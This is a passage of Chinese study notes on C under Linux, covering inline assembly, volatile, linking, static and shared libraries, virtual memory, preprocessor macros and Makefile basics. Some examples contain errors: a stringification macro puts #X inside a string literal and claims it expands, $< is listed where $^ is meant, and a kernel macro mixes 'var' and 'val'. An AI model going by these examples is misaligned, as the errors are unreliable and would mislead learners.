%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;int $0x80&quot;</span>);<br></code></pre></td></tr></table></figure><p>通常内联汇编需要和 C 代码中的变量建立关联, 要用到完整的内联汇编格式:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">__asm__(assembler template<br>        : output operands               <span class="hljs-regexp">/* option */</span><br>        : input operands                <span class="hljs-regexp">/* option */</span><br>        : list of clobbered registers   <span class="hljs-regexp">/* option */</span><br>        );<br></code></pre></td></tr></table></figure><p>第一部分是汇编指令. </p><p>第二部分和第三部分是约束条件, 第二部分告诉编译器汇编指令的运算结果要输出到哪些 C 语言操作数中, 这些操作数应该是左值表达式. 第三部分告诉编译器汇编指令需要从哪些 C 语言操作数中获得输入.</p><p>第四部分是在汇编指令中被修改的寄存器列表. 告诉编译器哪些寄存器的值在执行这条 <code>__asm__</code> 语句时会改变. 可选部分未填写就只写冒号.</p><p>gcc 扩展语法可以参考 <code>&lt;&lt;GCC online documentation&gt;&gt;</code></p><h2 id="18-6-volatile-限定符"><a href="#18-6-volatile-限定符" class="headerlink" title="18.6 volatile 限定符"></a>18.6 volatile 限定符</h2><p>编译器在优化时, 可能把不该优化的部分给优化了, 为了避免这种情况, 用 volatile 限定符修饰变量, 就是告诉编译器, 即使在编译时指定了优化选项, 每次读取这个变量时仍然要从内存读取, 每次写这个变量也仍要写会内存.</p><p>在为调试而编译时不要指定优化选项.</p><p>通常, 有 Cache 的平台都有办法对某一段地址范围禁用 Cache.</p><p>MMU 不仅要做地址转换和访问权限检查, 也要配合 Cache 工作.</p><p>除了设备寄存器需要用 volatile 限定之外, 当一个全局变量被同一进程中的多个控制流程访问时也要用 volatile 限定.</p><h1 id="第19章-链接详解"><a href="#第19章-链接详解" class="headerlink" title="第19章 链接详解"></a>第19章 链接详解</h1><p>书中内容: <code>putchar</code> 是 libc 的库函数, 在可执行文件 main 中仍然是未定义的, 要在程序运行时做动态链接.</p><p>实际上链接过程是由一个链接脚本 (Linker Script) 控制的, 链接脚本决定了给每个段分配什么地址, 如何对齐, 哪个段在前, 哪个段在后, 哪些段合并到同一个 Segment. 另外链接脚本还要把一些特殊地址定义成符号.</p><p>如果用 ld 进行链接时没有通过 <code>-T</code> 选项指定链接脚本, 则使用 ld 的默认链接脚本, 默认链接脚本可以用 <code>ld --verbose</code> 命令查看.</p><p>脚本的具体解析见书. 推荐参考为 <code>&lt;&lt;GNU Binutils Documentation&gt;&gt;</code>.</p><p>在 gdb 命令中指定某个 <code>.c</code> 文件中的某一行或某个函数, 可以用 “文件名:行号” 或 “文件名:函数名” 的语法:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(gdb) <span class="hljs-selector-tag">b</span> stack<span class="hljs-selector-class">.c</span>:<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h2 id="19-2-定义和声明"><a href="#19-2-定义和声明" class="headerlink" title="19.2 定义和声明"></a>19.2 定义和声明</h2><h3 id="19-2-1-extern-和-static-关键字"><a href="#19-2-1-extern-和-static-关键字" class="headerlink" title="19.2.1 extern 和 static 关键字"></a>19.2.1 extern 和 static 关键字</h3><p>凡是被多次声明的变量或函数, 必须有且只有一个声明是定义, 如果有多个定义, 或者一个定义都没有, 链接器就无法完成链接.</p><p>变量声明和函数声明有一点不同, 函数声明的 extern 关键词可以省略, 而变量声明如果不写 extern 则含义不同.</p><p>static 关键词可以实现对模块内部的保护, 也是一种封装.</p><h3 id="19-2-2-头文件"><a href="#19-2-2-头文件" class="headerlink" title="19.2.2 头文件"></a>19.2.2 头文件</h3><p>系统的头文件目录的顺序查找, 在 archlinux 上为 <code>/usr/local/include</code>, <code>/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.0/include/</code>, <code>/usr/include</code>.</p><p><code>-I</code> 选项告诉 gcc 头文件要到哪里去找.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> STACK_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这种保护头文件的写法称为 Header Guard.</p><p>重复包含头文件的问题:</p><ul><li>预处理和编译的速度变慢</li><li>可能陷入死循环</li><li>头文件里有些代码不允许重复出现, 如用 typedef 定义一个类型名, 在一个编译单元中只允许定义一次.</li></ul><p>写 <code>.c</code> 文件和头文件时一般来说应遵循以下规则:</p><ul><li><code>.c</code> 文件中可以有变量或函数定义, 而 <code>.h</code> 文件中应该只有变量或函数声明而没有定义.</li><li>不要把一个 <code>.c</code> 文件包含到另一个 <code>.c</code> 文件中</li></ul><h3 id="19-2-3-定义和声明的详细规则"><a href="#19-2-3-定义和声明的详细规则" class="headerlink" title="19.2.3 定义和声明的详细规则"></a>19.2.3 定义和声明的详细规则</h3><p>在块作用域中不允许用 static 关键字声明函数.</p><p>Tentative Definition 是指, 一个变量声明具有文件作用域, 没有初始化, 也没有用 Storage Class 关键字修饰, 或者用 static 关键字修饰, 那么编译器认为这个变量是在该编译单元中定义的, 但初始值特定, 然后继续编译下面的代码, 到整个单元编译结束时如果没有遇到这个变量带初始化的定义, 就将其初始化为 0.</p><p>C99 对 Tentative Definition 的处理是在编译一个单元时进行的, 而 gcc 是推迟到链接时才做.</p><h2 id="19-3-静态库"><a href="#19-3-静态库" class="headerlink" title="19.3 静态库"></a>19.3 静态库</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ar rs libstack<span class="hljs-selector-class">.a</span> stack<span class="hljs-selector-class">.o</span> push<span class="hljs-selector-class">.o</span> pop<span class="hljs-selector-class">.o</span> is_empty<span class="hljs-selector-class">.o</span><br>ar: creating libstak.a<br></code></pre></td></tr></table></figure><p>库文件名都是以 lib 开头的, 静态库以 <code>.a</code> 作为后缀, 表示 Archive.</p><p>ar 命令类似于 tar 命令, 也是用来打包的, 但是把目标文件打包成静态库的格式只能用 ar 命令而不能用 tar 命令.</p><p><code>r</code> 选项 (replacement) 表示将后面的目标文件列表添加到文件包 libstack.a 中, 如果 libstack.a 不存在就创建它, 如果 libstack.a 中已有同名的目标文件就替换成新的.</p><p><code>s</code> 选项表示为静态库创建索引, 这个索引被链接器使用, ranlib 命令也可以为静态库创建索引, 以下等价:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ar r libstack<span class="hljs-selector-class">.a</span> stack<span class="hljs-selector-class">.o</span> push<span class="hljs-selector-class">.o</span> pop<span class="hljs-selector-class">.o</span> is_empty<span class="hljs-selector-class">.o</span><br>$ ranlib libstack.a<br></code></pre></td></tr></table></figure><p>将 libstack.a 和 main.c 编译链接在一起:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> -L. -lstack -Istack -o <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p><code>-L</code> 选项告诉编译器去哪里找需要的库文件. <code>-I</code> 选项告诉编译器去哪里照头文件.</p><p>可以用 <code>-print-search-dirs</code> 选项来查看编译器默认查找的目录.</p><p>gcc 在链接时优先考虑共享库, 其次才是静态库. 如果希望 gcc 之考虑静态库, 可以指定 <code>-static</code> 选项.</p><p>链接共享库和链接静态库的区别:</p><ul><li>链接共享库时, 链接器只是确认了可执行文件中应用的某些符号是否有定义, 并没有最终确定这些符号的地址, 这些符号在可执行文件中仍然是未定义符号, 要在运行时做动态链接</li><li>链接静态库时, 链接器会把静态库中的目标文件取出来和可执行文件真正链接在一起.</li></ul><p>使用静态库的一个好处: 链接器从静态库中只取出需要的目标文件来做链接, 不需要的目标文件可以不链接.</p><p>另一个好处是: 只需写一个库文件名, 而不需要写一长串目标文件名.</p><h2 id="19-4-共享库"><a href="#19-4-共享库" class="headerlink" title="19.4 共享库"></a>19.4 共享库</h2><h3 id="19-4-1-编译-链接-运行"><a href="#19-4-1-编译-链接-运行" class="headerlink" title="19.4.1 编译, 链接. 运行"></a>19.4.1 编译, 链接. 运行</h3><p>组成共享库的目标文件和一般的目标文件有所不同, 在编译时要加 <code>-fPIC</code> 选项:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$ gcc -c -fPIC stack/stack.c stack/push.c stack/pop.c stack/is_empty.c<br></code></pre></td></tr></table></figure><p><code>-f</code> 后面跟一些编译选项, <code>PIC</code> 是其中一种, 表示生成位置无关代码 (Position Independent Code).</p><p>反汇编语句中一般会有 <code>sub $0x4,%esp</code> 这一句, 这是在开辟栈空间, 这里的 <code>$0x4</code> 表示有用了 4 字节的局部变量, 即, 移动栈顶指针 esp, 给被调用函数开辟栈帧. 后面的一句 <code>mov 0x8(%ebp),%eax</code> 是把传进来的参数值赋给 eax.</p><p>编译生成共享库:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ gcc -shared -o libstack<span class="hljs-selector-class">.so</span> stack<span class="hljs-selector-class">.o</span> push<span class="hljs-selector-class">.o</span> pop<span class="hljs-selector-class">.o</span> is_empty<span class="hljs-selector-class">.o</span> <br></code></pre></td></tr></table></figure><p>使用 <code>-shared</code> 选项, 并用 <code>-o</code> 指定文件名.</p><p>共享库中各段的加载地址并没有定死, 可以加载到任意位置, 因为指令中的地址都是相对于 <code>ebx</code>的.</p><p><code>lea</code> 指令算出第一个操作书所代表的地址, 但不访问内存, 而是直接把这个地址传给第二个操作数.</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">lea <span class="hljs-number">0</span>x1(<span class="hljs-built_in">%eax</span>),<span class="hljs-built_in">%edx</span><br></code></pre></td></tr></table></figure><p>程序编译时寻找共享库的路径和运行时的寻找路径不同.</p><p>利用 <code>ldd</code> 命令可以查看可执行文件依赖于哪些共享库. <code>ldd</code> 命令会模拟运行一边程序, 在运行过程中做动态链接, 从而得知这个程序依赖于哪些共享库以及这些共享库都在什么路径下.</p><p>gcc 调用 ld 做链接时用 <code>-dynamic-linker /lib/ld-linux.so.2</code> 选项指定动态链接器的路径, 动态链接器也像其他共享库一样加载到进程的地址空间中.</p><p>共享库的路径需要在运行时由动态链接器 <code>/lib/ld-linux.so.2</code> 去查找.</p><p>从 ld.so(8) 中可以查到共享库路径的搜索顺序. 具体见书.</p><p>环境变量 (Environment Variable) 是进程运行时保存在内存中的一组字符串, 每个字符串都是 “key&#x3D;value” 的形式, key 是变量名, value 是变量的值.</p><p>在创建进程是可以传递环境变量, 如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">LD_LIBRARY_PATH=<span class="hljs-regexp">/home/</span>akaedu<span class="hljs-regexp">/testdir ./m</span>ain<br></code></pre></td></tr></table></figure><p>配置文件 <code>/etc/ld.so.conf</code> 保存共享库路径, 添加后需要执行 <code>ldconfig</code> 命令:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo ldconfig -v<br></code></pre></td></tr></table></figure><h3 id="19-4-2-函数的动态链接过程"><a href="#19-4-2-函数的动态链接过程" class="headerlink" title="19.4.2 函数的动态链接过程"></a>19.4.2 函数的动态链接过程</h3><p><code>.plt</code> 段, PLT 是 Procedure Linkage Table 的缩写. <code>.plt</code> 段里保存的也是指令, 和 <code>.text</code> 一起合并到 Text Segment.</p><p>动态链接器利用 Globle Offset Table 的表项保存共享库中符号的绝对地址, 链接完成后, 通过 Globle Offset Table 的表项间接寻址即可访问共享库中的符号.</p><h3 id="19-4-3-共享库的命名惯例"><a href="#19-4-3-共享库的命名惯例" class="headerlink" title="19.4.3 共享库的命名惯例"></a>19.4.3 共享库的命名惯例</h3><p>每个共享库有三个文件名:</p><ul><li>real name</li><li>soname</li><li>linker name</li></ul><p>真正的库文件的名字是 real name, 包含完整的共享库版本号, 如: libcap.so.1.10</p><p>soname 是符号链接的名字, 只包含共享库的主版本号. 主版本号一致即可保证库函数的接口一致, 可执行文件的 <code>.dynamic</code> 段只记录共享库的 soname, 动态链接器只要找到 soname 一致的共享库就可以加载它做动态链接. 如: libcap.so.1</p><p>使用共享库可以很方便地升级库文件而不需要重新编译程序.</p><p>libc 的版本编号有一点特殊, libc-2.8.90.so 的主版本号是 6 而不是 2 或 2.8 </p><p>linker name 仅在编译链接时使用, gcc 的 <code>-L</code> 选项应该指定 linker name 所在的目录. 有的 linker name 是库文件的一个符号链接, 有的 linker name 是一段链接脚本.</p><p>编译器只认 linker name.</p><h2 id="19-5-虚拟内存管理"><a href="#19-5-虚拟内存管理" class="headerlink" title="19.5 虚拟内存管理"></a>19.5 虚拟内存管理</h2><p><code>/proc</code> 目录下的文件并不是真正的磁盘文件, 而是内核虚拟出来的, 当前每个运行的进程在 <code>/proc</code> 目录下都有一个子目录, 目录名就是进程的 id. <code>/proc/[id]/maps</code> 文件是进程地址空间的信息.</p><p>x86 平台的虚拟地址空间是 <code>0x00000000~0xffffffff</code>, 大致上前 3GB (<code>0x00000000~0xbfffffff</code>) 是用户空间, 后 1GB (<code>0xc0000000~0xffffffff</code>) 是内核空间.</p><p><code>0x09283000~0x09497000</code> 不是从磁盘文件加载到内存的, 这段空间称为 <mark>堆</mark> (Heap), 从 <code>0x7ca8000</code> 开始是共享库的映射空间, 每个共享库也分成几个 Segment, 每个 Segment 有不同的访问权限.</p><p>堆空间的地址上限 (<code>0x9479000</code>) 称为 Break, 堆空间要向高地址增长就要抬高 Break, 映射新的虚拟内存页面到物理内存, 这是通过系统调用 <code>brk</code> 实现的, <code>malloc</code> 函数也是调用 <code>brk</code> 向内核请求分配内存. </p><p><code>0xbfac5000~0bfada000</code> 是栈空间, 其中高地址部分保存这进程的环境变量和命令行参数, 低地址部分是栈空间.</p><p>操作系统的虚拟内存管理机制的作用 (具体见书):</p><ul><li>控制物理内存的访问权限, 物理内存本身是不限制访问的.</li><li>使每个进程有独立的地址空间, 不同进程中相同的 VA (Virtual Address) 被 MMU 映射到不同的 PA (Physic Address).</li><li>VA 到 PA 的映射会给分配和释放内存带来方便, 物理地址不连续的几块内存可以映射成虚拟地址连续的一块内存.</li><li>一个系统如果同时运行着很多进程, 为各进程分配的内存之和可能会大于实际可用的物理内存, 虚拟内存管理机制使这种情况下各进程仍然能够正常运行.</li></ul><p>每个进程都有自己的一套 VA 到 PA 的映射表, 在一个进程中通过 VA 只能访问到属于自己的物理页面.</p><p>两个进程的共享库加载地址并不相同, 共享库加载地址是在动态链接时确定的. 使用共享库可以节省物理内存, 比如 libc, 系统中几乎所有的进程都将 libc 映射到自己的进程空间, 而 libc 的只读部分在物理内存中只需要存在一份就可以被所有进程共享, 这就是 “共享库” 这个名称的由来.</p><p>在磁盘上开一个分区或者建一个文件专门用于临时保存虚拟内存页面的数据, 这被称为交换设备 (Swap Device).</p><h1 id="第20章-预处理"><a href="#第20章-预处理" class="headerlink" title="第20章 预处理"></a>第20章 预处理</h1><h2 id="20-1-预处理的步骤"><a href="#20-1-预处理的步骤" class="headerlink" title="20.1 预处理的步骤"></a>20.1 预处理的步骤</h2><p>预处理器把每个逻辑代码划分成 Token 和空白字符, 这时 Token 称为预处理 Token. 在划分 Token 时要遵循最长匹配原则.</p><p>在 Token 中识别出宏定义和预处理指示, 如果遇到宏定义则做宏展开, 遇到预处理指示则作出相应的与处理动作.</p><p>此处之记录了部分步骤.</p><p>找出字符常量或字符串字面值中的转移序列, 用相应的字节来替换它, 比如把 <code>\n</code> 替换成 <code>0x0a</code>.</p><p>把相邻的字符串字面值连接起来.</p><p>把一个预处理指示写成多行要用 <code>\</code> 续行, 因为根据定义, 一条预处理指示只能由一个逻辑代码行组成, 而把 C 代码写成多行则不必用 <code>\</code> 续行, 因为换行在 C 代码中只不过是一种空白字符.</p><h2 id="20-2-宏定义"><a href="#20-2-宏定义" class="headerlink" title="20.2 宏定义"></a>20.2 宏定义</h2><h3 id="20-2-1-函数式宏定义"><a href="#20-2-1-函数式宏定义" class="headerlink" title="20.2.1 函数式宏定义"></a>20.2.1 函数式宏定义</h3><p>变量式宏定义 (Object-like Macro), 如:</p><ul><li><code>#define N 20</code></li><li><code>#define STR &quot;hello world&quot;</code></li></ul><p>函数式宏定义 (Function-like Macro), 如:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#define MAX(<span class="hljs-name">a</span>, b) ((<span class="hljs-name">a</span>)&gt;(<span class="hljs-name">b</span>)?(<span class="hljs-name">a</span>):(<span class="hljs-name">b</span>))<br></code></pre></td></tr></table></figure><p>用 gcc 的 <code>-E</code> 选项或者用 cpp 处理.</p><p>函数式宏定义和真正的函数调用区别:</p><ul><li>函数式定义宏的参数没有类型, 预处理器只进行形式上的替换, 而不做参数类型检查</li><li>调用真正的函数和调用函数式定义宏的代码编译生成的指令不同. 使用函数式定义宏编译生成的目标文件会比较大.</li></ul><p>一般来说, 简短的, 被频繁调用的函数适合用函数式宏定义来代替实现.</p><p>函数式定义经常写成以下形式 (内核代码 <code>include/linux/pm.h</code>):</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#define device<span class="hljs-constructor">_init_wekeup(<span class="hljs-params">dev</span>,<span class="hljs-params">val</span>)</span> \<br>        <span class="hljs-keyword">do</span> &#123; \<br>                device<span class="hljs-constructor">_can_wekeup(<span class="hljs-params">dev</span>)</span> = !!(var); \<br>                device<span class="hljs-constructor">_set_wekeup_enable(<span class="hljs-params">dev</span>,<span class="hljs-params">val</span>)</span>; \<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h3 id="20-2-2-内联函数"><a href="#20-2-2-内联函数" class="headerlink" title="20.2.2 内联函数"></a>20.2.2 内联函数</h3><p>C99 引入的新关键字 <code>inline</code>, 用于定义内联函数 (Inline Function).</p><p>如:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">static inline void <span class="hljs-built_in">down_read</span>(struct rw_semaphore *sem)<br>&#123;<br>        <span class="hljs-built_in">might_sleep</span>();<br>        <span class="hljs-built_in">rwsemtrace</span>(sem,&quot;Entering down_read&quot;);<br>        <span class="hljs-built_in">__down_read</span>(sem);<br>        <span class="hljs-built_in">rwsemtrace</span>(sem,&quot;Leaving down_read&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>inline</code> 关键字告诉编译器, 这个函数的调用要尽可能快, 可以当普通的函数调用实现, 也可以用宏展开的方法实现.</p><h3 id="20-2-3-运算符和可变参数"><a href="#20-2-3-运算符和可变参数" class="headerlink" title="20.2.3 #, ## 运算符和可变参数"></a>20.2.3 #, ## 运算符和可变参数</h3><p>有:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">PSQR</span>(X) <span class="hljs-built_in">printf</span>(&quot;The square of X is %d.\n&quot;, ((X)*(X)));<br><span class="hljs-built_in">PSQR</span>(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>这样的输出结果为:</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mercury">The square of X <span class="hljs-keyword">is</span> <span class="hljs-number">64</span>.<br></code></pre></td></tr></table></figure><p>如果使用 <code>#</code>:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">PSQR</span>(X) <span class="hljs-built_in">printf</span>(&quot;The square of #X is %d.\n&quot;, ((X)*(X)));<br><span class="hljs-built_in">PSQR</span>(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>则输出结果为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">The</span> square of <span class="hljs-number">8</span> is <span class="hljs-number">64</span>.<br></code></pre></td></tr></table></figure><p>将形参对应的参数替换为了相应的字符串.</p><p><code>##</code> 用于把前后两个 Token 连接成一个预处理 Token.</p><p>如:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">CONCAT</span>(<span class="hljs-selector-tag">a</span>, b) a#<span class="hljs-selector-id">#b</span><br><span class="hljs-function"><span class="hljs-title">CONCAT</span><span class="hljs-params">(con, cat)</span></span><br></code></pre></td></tr></table></figure><p>的结果就是 <code>concat</code>.</p><p>函数式宏定义也可以带可变参数, 同样是在参数列表中用 <code>...</code> 表示可变参数.</p><p>如:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">showlist</span>(...) <span class="hljs-built_in">printf</span>(#__VA_ARGS__)<br></code></pre></td></tr></table></figure><p>宏定义中可变参数部分用 <code>__VA_ARGS__</code> 表示, 在宏展开时和 <code>...</code> 对应的几个实参可以看成一个实参来替换掉 <code>__VA_ARGS__</code>.</p><p>调用函数式宏定义允许传空参数.</p><p>在定义时带三个参数, 在调用时也必须给它传三个参数, 空参数的位置可以空着, 但必须给足三个参数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">FOO</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c) a##b#<span class="hljs-selector-id">#c</span><br><span class="hljs-function"><span class="hljs-title">FOO</span><span class="hljs-params">(,,<span class="hljs-number">3</span>)</span></span><br></code></pre></td></tr></table></figure><h3 id="20-2-4-undef-预处理指示"><a href="#20-2-4-undef-预处理指示" class="headerlink" title="20.2.4 #undef 预处理指示"></a>20.2.4 #undef 预处理指示</h3><p>如果在一个编译单元中重复定义一个宏, C 语言规定这些重复的宏定义必须一模一样.</p><p>可以用 <code>#undef</code> 取消原来定义的宏.</p><h3 id="20-2-5-宏展开的步骤"><a href="#20-2-5-宏展开的步骤" class="headerlink" title="20.2.5 宏展开的步骤"></a>20.2.5 宏展开的步骤</h3><h2 id="20-3-条件预处理指示"><a href="#20-3-条件预处理指示" class="headerlink" title="20.3 条件预处理指示"></a>20.3 条件预处理指示</h2><p>条件预处理指示也常用于源代码的配置管理:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">if</span> MACHINE == 68000</span><br><span class="hljs-type">int</span> x;<br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> MACHINE == 8086</span><br><span class="hljs-type">long</span> x;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span> </span><br>    <span class="hljs-meta">#<span class="hljs-keyword">error</span> UNKOWN TARGET MACHINE</span><br> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><code>#ifdef</code> 或  <code>#if</code> 可以嵌套使用, 但预处理指示通常都顶头写不缩进.</p><p>gcc 的 <code>-D</code> 选项可以定义宏.</p><h2 id="20-4-其他预处理特性"><a href="#20-4-其他预处理特性" class="headerlink" title="20.4 其他预处理特性"></a>20.4 其他预处理特性</h2><p><code>#pragma</code> 提供的扩展特性是由编译器自己规定的.</p><p>C 标准规定了几个特殊的宏, 不需要定义即可使用:</p><ul><li><code>__FILE__</code>, 展开成当前源文件的文件名, 是一个字符串</li><li><code>__LINE__</code>, 展开成当前代码行的行号, 是一个整数</li></ul><p>C 标准规定, assert 应该实现成函数式宏定义而不是一个真正的函数, 并且 <code>assert(test)</code> 这个表达式应该是 void 类型.</p><p><code>((void)0)</code> 表示一个 void 类型的值.</p><h1 id="第21章-Makefile-基础"><a href="#第21章-Makefile-基础" class="headerlink" title="第21章 Makefile 基础"></a>第21章 Makefile 基础</h1><p>对于 Makefile 中每个以 Tab 开头的命令, make 会启动一个 Shell 进程去执行它.</p><p>在命令前面加 <code>@</code> 和 <code>-</code> 的效果:</p><ul><li><code>@</code> (At Sign), 不显示命令本身而只显示它的输出结果 </li><li><code>-</code> (Hyphen), 即使命令出错, make 也会继续执行后续任务</li></ul><p>通常 <code>rm</code> 和 <code>mkdir</code> 命令前面要加上 <code>-</code> 字符, 因为 <code>rm</code> 要删除的文件可能不存在, <code>mkdir</code> 要创建的文件可能已经存在.</p><p><code>.PHONY</code> 声明一个伪目标, 避免和文件名重名.</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">clean:</span><br>        -rm main *.o <br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br></code></pre></td></tr></table></figure><p>写在后面也有效.</p><h2 id="21-2-隐含规则和模式规则"><a href="#21-2-隐含规则和模式规则" class="headerlink" title="21.2 隐含规则和模式规则"></a>21.2 隐含规则和模式规则</h2><p>可以把一个目标拆开写成多条规则, 其中只有一条规则允许有文件列表.</p><p>如果一个目标在 Makefile 中的所有规则都没有命令列表, make 会尝试在内建的隐含规则 (Implicit Rule) 数据库中查找适用的规则.</p><p>make 的隐含规则数据库可以用 <code>make -p</code> 命令打印出来.</p><p>Makefile 变量就像环境变量或者 C 语言的宏定义一样, 代表一串字符 (或者空字符串), 并且按照惯例通常用大写字母加下划线命名.</p><p>变量名加上括号和 <code>$</code> (Dollar Sign) 表示将变量值展开:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$(<span class="hljs-keyword">VAR</span>)<br></code></pre></td></tr></table></figure><p><code>%</code> 在 Makefile 语法中表示 0 个或多个匹配项.</p><p><code>$@</code> 和 <code>$&lt;</code> 这两个特殊变量:</p><ul><li><code>$@</code>, 取值是当前规则中的目标</li><li><code>$&lt;</code>, 取值是当前规则中的第一个条件</li></ul><p><code>%.o: %.c</code> 是模式规则 (Pattern Rule).</p><p>多目标:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">target1 target2: prerequisitel1 prerequisitel2<br>    <span class="hljs-built_in">command</span> $&lt; -o <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><p>相当于:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">target</span><span class="hljs-number">1</span>: prerequisitel<span class="hljs-number">1</span> prerequisitel<span class="hljs-number">2</span><br>    command prerequisitel<span class="hljs-number">1</span> -o <span class="hljs-keyword">target</span><span class="hljs-number">1</span><br><br><span class="hljs-keyword">target</span><span class="hljs-number">2</span>: prerequisitel<span class="hljs-number">1</span> prerequisitel<span class="hljs-number">2</span><br>    command prerequisitel<span class="hljs-number">1</span> -o <span class="hljs-keyword">target</span><span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><p>make 处理 Makefile 的过程分为两个阶段:</p><ul><li>根据规则建立以来关系图</li><li>根据依赖关系图选择适当的规则执行</li></ul><p>通常把 <code>CFLAGS</code> 定义成一些编译选项.</p><p>通常把 <code>CPPFLAGS</code> 定义成一些预处理选项.</p><p><code>:=</code> 操作符表示, 前面使用定义的变量不能使用这个变量, 防止死循环.</p><p>造空格:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">space := <span class="hljs-variable">$(nullstring)</span> <span class="hljs-comment"># end of the line</span><br></code></pre></td></tr></table></figure><p>空格为 <code>#</code> 前面那一个.</p><p><code>?=</code> 操作符.</p><p>常见的自动变量:</p><ul><li><code>$@</code>, 表示规则中的目标</li><li><code>$&lt;</code>, 表示规则中的第一个条件</li><li><code>$?</code>, 表示规则中所有比目标新的条件, 组成一个列表, 用空格分隔</li><li><code>$&lt;</code>, 表示规则中的所有条件, 组成一个列表, 以空格分隔, 